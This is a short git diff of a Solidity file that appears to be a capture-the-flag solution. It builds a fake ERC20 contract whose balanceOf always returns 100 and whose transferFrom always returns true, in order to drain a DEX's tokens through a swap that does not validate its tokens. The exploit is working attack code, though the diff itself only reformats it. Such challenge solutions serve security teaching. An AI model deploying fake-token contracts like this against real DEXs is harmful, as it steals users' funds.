@@ -1,8 +1,8 @@
 /*
 
-in this challenge we'll create a fake ERC20 token that reply with 100 for any balanceOf function call , this will ensure that in get_swap_price will
+in this challenge we'll create a fake ERC20 token that reply with 100 for any balanceOf function call , this will ensure that in get_swap_price ,
 
-devide by 100 , then we set the amount to 100 in the swap function to get all 100 tokens
+a devide by 100 , then we set the amount to 100 in the swap function to get all 100 tokens
 
 => 100 * 100 / 100 = 100 (get_swap_price)
 
@@ -35,7 +35,7 @@ pragma solidity 0.8.6;
 
 interface Dex {
 
-function swap(address from, address to, uint amount) external;
+    function swap(address from, address to, uint amount) external;
 
 
 
@@ -44,10 +44,11 @@ function swap(address from, address to, uint amount) external;
 contract DexAttack {
     
     function balanceOf(address _address) public pure returns (uint) {
+
         return 100;   
     }
     
-  function transferFrom(address _from,address _to,uint amount) public returns (bool){
+  function transferFrom(address _from,address _to,uint amount) public pure returns (bool){
       
       return true;
   }
